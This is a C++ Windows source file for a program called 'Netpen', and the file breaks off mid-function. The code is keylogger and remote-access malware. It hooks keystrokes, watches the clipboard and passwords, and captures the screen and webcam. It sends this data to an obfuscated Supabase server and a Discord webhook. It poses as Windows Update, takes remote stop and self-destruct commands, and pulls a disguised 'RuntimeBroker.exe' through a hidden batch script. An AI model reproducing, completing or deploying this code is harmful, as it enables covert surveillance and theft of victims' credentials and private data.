#include <windows.h>
#define INITGUID
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>
#include <algorithm>
#include <cstdint>
#include <ctime>
#include <wincrypt.h>
#include <bcrypt.h>
#include <gdiplus.h>
#include <dshow.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include "config.h"
#include <tlhelp32.h>
#include "capture_shared.h"

// Missing DirectShow declarations (not available in this mingw version)
static const CLSID CLSID_SampleGrabber = {0xC1F400A0,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
static const CLSID CLSID_NullRenderer = {0xC1F400A4,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
static const IID IID_ISampleGrabber = {0x6B652FFF,0x11FE,0x4fce,{0x92,0xAD,0x02,0x66,0xB5,0xD7,0xC7,0x8F}};
MIDL_INTERFACE("6B652FFF-11FE-4fce-92AD-0266B5D7C78F")
ISampleGrabber : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE SetOneShot(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetMediaType(const AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType(AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetBufferSamples(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer(long*, long*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetSample(IMediaSample**) = 0;
};

#ifndef NETPEN_VERSION
#define NETPEN_VERSION 0
#endif

#define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
#define SUPABASE_CONTROL_PATH L"/rest/v1/control"
#define SUPABASE_EXEC_PATH L"/rest/v1/exec_results"
#define SUPABASE_CONFIG_PATH L"/rest/v1/agent_config"
#define SUPABASE_HEARTBEAT_PATH L"/rest/v1/heartbeat?hostname=eq."
#define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
#define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"

static HHOOK g_hHook = NULL;
static std::string g_winTitle;
static std::string g_keys;
static DWORD g_lastTick = 0;
static DWORD g_lastDiscord = 0;
static DWORD g_lastAutoScreenshot = 0;
static std::vector<std::string> g_triggers;
static bool g_running = true;
static bool g_selfDestructing = false;
static bool g_harvestPaused = false;
static std::string g_hostname;
static std::string g_lastClipboard;
static std::string g_lastPasswordDigest;
static HWND g_hwnd = NULL;

static std::wstring g_supabaseHost;
static std::wstring g_supabaseKey;
static std::wstring g_supabaseServiceKey;
static std::wstring g_discordHost;
static std::wstring g_discordPath;

static void InitConfig() {
    g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
    g_supabaseKey = DecryptW(_enc_SUPABASE_ANON_KEY, sizeof(_enc_SUPABASE_ANON_KEY));
    g_supabaseServiceKey = DecryptW(_enc_SUPABASE_SERVICE_KEY, sizeof(_enc_SUPABASE_SERVICE_KEY));
    g_discordHost = DecryptW(_enc_DISCORD_HOST, sizeof(_enc_DISCORD_HOST));
    g_discordPath = DecryptW(_enc_DISCORD_PATH, sizeof(_enc_DISCORD_PATH));
}

static std::wstring ToWide(const std::string& s) {
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    std::wstring buf((size_t)len - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &buf[0], len);
    return buf;
}

static std::string ToNarrow(const std::wstring& s) {
    int len = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, NULL, 0, NULL, NULL);
    std::string buf((size_t)len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, &buf[0], len, NULL, NULL);
    return buf;
}

static std::string EscapeJSON(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (size_t i = 0; i < s.size(); i++) {
        char c = s[i];
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if ((unsigned char)c < 0x20) {
                    char buf[8];
                    sprintf_s(buf, 8, "\\u%04x", (unsigned char)c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

static std::string ExtractJSONString(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    std::string result;
    while (pos < json.size()) {
        char c = json[pos];
        if (c == '\\') {
            pos++;
            if (pos >= json.size()) break;
            if (json[pos] == '"') result += '"';
            else if (json[pos] == '\\') result += '\\';
            else if (json[pos] == 'n') result += '\n';
            else if (json[pos] == 'r') result += '\r';
            else if (json[pos] == 't') result += '\t';
            else { result += '\\'; result += json[pos]; }
        } else if (c == '"') {
            break;
        } else {
            result += c;
        }
        pos++;
    }
    return result;
}

static std::string ExtractJSONNumber(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    size_t end = json.find_first_of(",}]", pos);
    if (end == std::string::npos) return "";
    return json.substr(pos, end - pos);
}

static std::string GetTimestamp() {
    time_t now = time(NULL);
    struct tm* tm = gmtime(&now);
    char buf[32] = {0};
    strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", tm);
    return std::string(buf);
}

static std::string GetExeName() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full(path);
    size_t pos = full.find_last_of("\\/");
    if (pos != std::string::npos) return full.substr(pos + 1);
    return full;
}

static std::wstring GetExeNameW() {
    return ToWide(GetExeName());
}

static std::string GetWindowTitle() {
    char buf[512] = {0};
    HWND hwnd = GetForegroundWindow();
    if (hwnd) GetWindowTextA(hwnd, buf, sizeof(buf) - 1);
    return std::string(buf);
}

static std::string GetKeyString(DWORD vk) {
    bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool upper = shift ^ caps;

    if (vk >= 'A' && vk <= 'Z') {
        char c = upper ? (char)vk : (char)(vk + 32);
        return std::string(1, c);
    }

    if (vk >= '0' && vk <= '9') {
        const char* shiftNums = ")!@#$%^&*(";
        char c = shift ? shiftNums[vk - '0'] : (char)vk;
        return std::string(1, c);
    }

    switch (vk) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[Enter]";
        case VK_TAB: return "[Tab]";
        case VK_BACK: return "[Back]";
        case VK_DELETE: return "[Del]";
        case VK_ESCAPE: return "[Esc]";
        case VK_UP: return "[Up]";
        case VK_DOWN: return "[Down]";
        case VK_LEFT: return "[Left]";
        case VK_RIGHT: return "[Right]";
        case VK_HOME: return "[Home]";
        case VK_END: return "[End]";
        case VK_PRIOR: return "[PgUp]";
        case VK_NEXT: return "[PgDn]";
        case VK_INSERT: return "[Ins]";
        case VK_SNAPSHOT: return "[PrtSc]";
        case VK_PAUSE: return "[Pause]";
        case VK_APPS: return "[Menu]";
        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL: return "";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "";
        case VK_LWIN: case VK_RWIN: return "";
        case VK_VOLUME_MUTE: case VK_VOLUME_DOWN: case VK_VOLUME_UP: return "";
        case VK_MEDIA_NEXT_TRACK: case VK_MEDIA_PREV_TRACK: return "";
        case VK_MEDIA_STOP: case VK_MEDIA_PLAY_PAUSE: return "";
        default: break;
    }

    if (vk >= VK_F1 && vk <= VK_F24) {
        char buf[16];
        sprintf_s(buf, 16, "[F%d]", vk - VK_F1 + 1);
        return std::string(buf);
    }

    switch (vk) {
        case VK_OEM_1: return shift ? ":" : ";";
        case VK_OEM_PLUS: return shift ? "+" : "=";
        case VK_OEM_COMMA: return shift ? "<" : ",";
        case VK_OEM_MINUS: return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2: return shift ? "?" : "/";
        case VK_OEM_3: return shift ? "~" : "`";
        case VK_OEM_4: return shift ? "{" : "[";
        case VK_OEM_5: return shift ? "|" : "\\";
        case VK_OEM_6: return shift ? "}" : "]";
        case VK_OEM_7: return shift ? "\"" : "'";
        case VK_OEM_102: return shift ? "|" : "\\";
        case VK_DIVIDE: return "/";
        case VK_MULTIPLY: return "*";
        case VK_SUBTRACT: return "-";
        case VK_ADD: return "+";
        case VK_DECIMAL: return ".";
        default: break;
    }

    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        char c = '0' + (vk - VK_NUMPAD0);
        return std::string(1, c);
    }

    return "";
}

static void LogMsg(const std::string& msg) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string logPath = std::string(tmp) + "wuaueng.log";
    FILE* f = NULL;
    fopen_s(&f, logPath.c_str(), "a");
    if (f) {
        fprintf(f, "[%s] %s\n", GetTimestamp().c_str(), msg.c_str());
        fclose(f);
    }
}

static std::string Base64Encode(const BYTE* data, DWORD size);

static void WriteCrashLog(DWORD exceptionCode, ULONG_PTR address) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string path = std::string(tmp) + "wuaueng.crash";
    FILE* f = NULL;
    fopen_s(&f, path.c_str(), "a");
    if (f) {
        fprintf(f, "[%s] CRASH: code 0x%08lX at 0x%p\n", GetTimestamp().c_str(), exceptionCode, (void*)address);
        fclose(f);
    }
}

static LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ep) {
    WriteCrashLog(ep->ExceptionRecord->ExceptionCode, (ULONG_PTR)ep->ExceptionRecord->ExceptionAddress);
    return EXCEPTION_CONTINUE_SEARCH;
}

static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::string& body, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"apikey: ";
    headers += g_supabaseKey;
    headers += L"\r\nAuthorization: Bearer ";
    headers += g_supabaseKey;
    headers += L"\r\nContent-Type: application/json";

    BOOL sent = FALSE;
    if (body.empty()) {
        sent = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), NULL, 0, 0, 0);
    } else {
        sent = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    }

    if (!sent) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::string result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        ZeroMemory(buf, size + 1);
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            result.append(buf, downloaded);
        }
        delete[] buf;
    }

    response = result;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}

static bool PostKeys(const std::string& json) {
    std::string response;
    return HttpRequest(L"POST", SUPABASE_KEYS_PATH, json, response);
}

static bool HttpGetToString(const wchar_t* path, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    std::string result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        ZeroMemory(buf, size + 1);
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0)
            result.append(buf, downloaded);
        delete[] buf;
    }
    response = result;
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return true;
}

static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    bool ok = true;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            DWORD written = 0;
            if (!WriteFile(hFile, buf, downloaded, &written, NULL) || written != downloaded) { ok = false; delete[] buf; break; }
        }
        delete[] buf;
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    if (!ok) { DeleteFileA(outputPath); return false; }
    return true;
}

static bool IsSpamText(const std::string& s) {
    if (s.size() <= 5) return false;
    bool seen[256] = {false};
    int unique = 0;
    for (size_t i = 0; i < s.size(); i++) {
        if (!seen[(unsigned char)s[i]]) {
            seen[(unsigned char)s[i]] = true;
            unique++;
            if (unique >= 3) return false;
        }
    }
    return true;
}

static void PostToDiscord(const std::string& hostname, const std::string& window, const std::string& keys) {
    if (IsSpamText(keys)) return;
    DWORD now = GetTickCount();
    if (now - g_lastDiscord < 30000) return;
    g_lastDiscord = now;
    std::string host = hostname.empty() ? "unknown" : hostname;
    std::string win = window.empty() ? "unknown" : window;
    std::string k = keys.empty() ? "(no keys)" : keys;
    if (k.size() > 1990) k = k.substr(0, 1990) + "...";

    std::string payload = "{\"embeds\":[{\"title\":\"Netpen \\u2014 ";
    payload += EscapeJSON(host);
    payload += "\",\"color\":3066993,\"fields\":[{\"name\":\"Window\",\"value\":\"";
    payload += EscapeJSON(win);
    payload += "\",\"inline\":false}],\"description\":\"";
    payload += EscapeJSON(k);
    payload += "\",\"timestamp\":\"";
    payload += GetTimestamp();
    payload += "\"}]}";

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring headers = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(),
        (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

static bool CheckStop() {
    std::wstring query = SUPABASE_CONTROL_PATH;
    query += L"?command=eq.stop&executed=eq.false&hostname=eq.";
    query += ToWide(g_hostname);
    query += L"&select=id";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
    if (response.empty() || response == "[]") return false;
    std::string rowId = ExtractJSONNumber(response, "id");
    if (!rowId.empty()) {
        std::string patch = "{\"executed\":true}";
        std::wstring patchPath = SUPABASE_CONTROL_PATH;
        patchPath += L"?id=eq." + ToWide(rowId);
        HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
    }
    return true;
}

static std::string GetExeDir() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full(path);
    size_t pos = full.find_last_of("\\/");
    if (pos != std::string::npos) return full.substr(0, pos + 1);
    return "";
}

static void CreateKillFlag() {
    std::string flagPath = GetExeDir() + ".kill";
    FILE* f = NULL;
    fopen_s(&f, flagPath.c_str(), "w");
    if (f) fclose(f);
}

static bool KillFlagExists() {
    FILE* f = NULL;
    std::string flagPath = GetExeDir() + ".kill";
    fopen_s(&f, flagPath.c_str(), "r");
    if (f) { fclose(f); return true; }
    return false;
}

static void RemoveKillFlag() {
    std::string flagPath = GetExeDir() + ".kill";
    DeleteFileA(flagPath.c_str());
}

static bool CheckSelfDestruct() {
    std::wstring query = SUPABASE_CONTROL_PATH;
    query += L"?command=eq.selfdestruct&executed=eq.false&hostname=eq.";
    query += ToWide(g_hostname);
    query += L"&select=id";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
    if (response.empty() || response == "[]") return false;
    std::string rowId = ExtractJSONNumber(response, "id");
    if (!rowId.empty()) {
        std::string patch = "{\"executed\":true}";
        std::wstring patchPath = SUPABASE_CONTROL_PATH;
        patchPath += L"?id=eq." + ToWide(rowId);
        HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
    }
    return true;
}

static void CheckHarvestConfig() {
    std::wstring query = SUPABASE_CONFIG_PATH;
    query += L"?key=eq.harvest_paused&select=value";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return;
    // response is like [{"value":"true"}] or [{"value":"false"}]
    std::string needle = "\"value\":\"";
    size_t start = response.find(needle);
    if (start == std::string::npos) return;
    start += needle.size();
    size_t end = response.find("\"", start);
    if (end == std::string::npos) return;
    std::string val = response.substr(start, end - start);
    g_harvestPaused = (val == "true");
}

static int GetRemoteVersion() {
    std::string s;
    if (!HttpGetToString(STORAGE_VER_PATH, s)) return -1;
    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' ' || s.back() == '\t'))
        s.pop_back();
    if (s.empty()) return -1;
    return atoi(s.c_str());
}

static bool DeployUpdate(int remoteVer) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string newExe = std::string(tmp) + "NetpenUpdate.exe";
    std::string batFile = std::string(tmp) + "NetpenUpdate.bat";
    if (!HttpDownloadToFile(STORAGE_EXE_PATH, newExe.c_str())) {
        LogMsg("Update: download failed");
        return false;
    }
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::string exeName = GetExeName();
    std::string bat =
        std::string("@echo off\r\n")
        + "set \"O=" + std::string(selfPath) + "\"\r\n"
        + "set \"N=" + newExe + "\"\r\n"
        + ":w\r\ntasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
        + "if errorlevel 1 goto r\r\ntimeout /t 2 /nobreak >nul\r\ngoto w\r\n"
        + ":r\r\ncopy /y \"%N%\" \"%O%\" >nul\r\n"
        + "start \"\" \"%O%\"\r\n"
        + "del \"%N%\"\r\ndel \"%~f0\"\r\n";
    HANDLE hf = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { DeleteFileA(newExe.c_str()); return false; }
    DWORD w = 0;
    WriteFile(hf, bat.c_str(), (DWORD)bat.size(), &w, NULL);
    CloseHandle(hf);
    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    std::string cmd = "cmd.exe /c \"" + batFile + "\"";
    if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileA(newExe.c_str()); DeleteFileA(batFile.c_str()); return false;
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    LogMsg("Update deployed: v" + std::to_string(remoteVer));
    return true;
}

static int GetEncoderClsid(const wchar_t* format, CLSID* clsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* codecs = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(codecs[i].MimeType, format) == 0) { *clsid = codecs[i].Clsid; free(codecs); return i; }
    }
    free(codecs);
    return -1;
}

static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc);

static bool CaptureScreen(const char* outputPath) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    int w = GetDeviceCaps(hScreenDC, HORZRES);
    int h = GetDeviceCaps(hScreenDC, VERTRES);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    if (GetEncoderClsid(L"image/jpeg", &clsid) < 0) {
        DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
        return false;
    }

    Gdiplus::EncoderParameters eps;
    eps.Count = 1;
    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    eps.Parameter[0].NumberOfValues = 1;
    UINT q = 80;
    eps.Parameter[0].Value = &q;

    bool ok = bitmap.Save(ToWide(outputPath).c_str(), &clsid, &eps) == Gdiplus::Ok;
    DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
    return ok;
}

static bool CaptureWebcamFrame(const char* outputPath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;
    bool result = false;
    IGraphBuilder* pGraph = NULL;
    ICaptureGraphBuilder2* pBuilder = NULL;
    IMediaControl* pControl = NULL;
    IBaseFilter* pCapFilter = NULL;
    IBaseFilter* pNullFilter = NULL;
    IBaseFilter* pGrabberBase = NULL;
    ISampleGrabber* pGrabber = NULL;
    do {
        CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);
        CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuilder);
        if (!pGraph || !pBuilder) break;
        pBuilder->SetFiltergraph(pGraph);
        ICreateDevEnum* pDevEnum = NULL;
        IEnumMoniker* pEnum = NULL;
        if (FAILED(CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum))) break;
        hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
        pDevEnum->Release();
        if (FAILED(hr) || !pEnum) break;
        IMoniker* pMoniker = NULL;
        if (pEnum->Next(1, &pMoniker, NULL) != S_OK) { pEnum->Release(); break; }
        pEnum->Release();
        if (FAILED(pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCapFilter))) { pMoniker->Release(); break; }
        pMoniker->Release();
        pGraph->AddFilter(pCapFilter, L"Capture");
        CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_ISampleGrabber, (void**)&pGrabber);
        if (!pGrabber) break;
        if (FAILED(pGrabber->QueryInterface(IID_IBaseFilter, (void**)&pGrabberBase))) break;
        AM_MEDIA_TYPE mt;
        ZeroMemory(&mt, sizeof(mt));
        mt.majortype = MEDIATYPE_Video;
        mt.subtype = MEDIASUBTYPE_RGB24;
        pGrabber->SetMediaType(&mt);
        pGraph->AddFilter(pGrabberBase, L"Grabber");
        CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullFilter);
        if (pNullFilter) pGraph->AddFilter(pNullFilter, L"Null");
        if (FAILED(pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCapFilter, pGrabberBase, pNullFilter))) break;
        pGrabber->SetOneShot(TRUE);
        pGrabber->SetBufferSamples(TRUE);
        if (FAILED(pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl))) break;
        if (FAILED(pControl->Run())) break;
        DWORD waitStart = GetTickCount();
        bool gotSample = false;
        while (GetTickCount() - waitStart < 5000) {
            OAFilterState state;
            pControl->GetState(10, &state);
            if (state == State_Running) { Sleep(2000); long cb = 0; if (pGrabber->GetCurrentBuffer(&cb, NULL) == S_OK) { gotSample = true; break; } }
            Sleep(100);
        }
        if (!gotSample) break;
        long cbBuffer = 0;
        if (FAILED(pGrabber->GetCurrentBuffer(&cbBuffer, NULL))) break;
        BYTE* pBuffer = new BYTE[cbBuffer];
        if (FAILED(pGrabber->GetCurrentBuffer(&cbBuffer, (long*)pBuffer))) { delete[] pBuffer; break; }
        AM_MEDIA_TYPE actualMt;
        ZeroMemory(&actualMt, sizeof(actualMt));
        if (FAILED(pGrabber->GetConnectedMediaType(&actualMt))) { delete[] pBuffer; break; }
        VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)actualMt.pbFormat;
        if (actualMt.formattype == FORMAT_VideoInfo && actualMt.cbFormat >= sizeof(VIDEOINFOHEADER) && vih) {
            LONG w = vih->bmiHeader.biWidth;
            LONG h = abs(vih->bmiHeader.biHeight);
            BITMAPINFO bmi;
            ZeroMemory(&bmi, sizeof(bmi));
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bmi.bmiHeader.biWidth = w;
            bmi.bmiHeader.biHeight = -h;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = BI_RGB;
            HDC hdc = GetDC(NULL);
            HBITMAP hBmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, NULL, NULL, 0);
            if (hBmp) {
                SetBitmapBits(hBmp, cbBuffer, pBuffer);
                Gdiplus::Bitmap bitmap(hBmp, NULL);
                CLSID clsid;
                if (GetEncoderClsid(L"image/jpeg", &clsid) >= 0) {
                    Gdiplus::EncoderParameters eps;
                    eps.Count = 1;
                    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
                    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                    eps.Parameter[0].NumberOfValues = 1;
                    UINT q = 80;
                    eps.Parameter[0].Value = &q;
                    result = (bitmap.Save(ToWide(outputPath).c_str(), &clsid, &eps) == Gdiplus::Ok);
                }
                DeleteObject(hBmp);
            }
            ReleaseDC(NULL, hdc);
        }
        if (actualMt.pbFormat) CoTaskMemFree(actualMt.pbFormat);
        delete[] pBuffer;
    } while (false);
    if (pControl) { pControl->Stop(); pControl->Release(); }
    if (pGrabberBase) pGrabberBase->Release();
    if (pGrabber) pGrabber->Release();
    if (pNullFilter) pNullFilter->Release();
    if (pCapFilter) pCapFilter->Release();
    if (pBuilder) pBuilder->Release();
    if (pGraph) pGraph->Release();
    CoUninitialize();
    return result;
}

static bool CaptureSpeaker(const char* outputPath) {
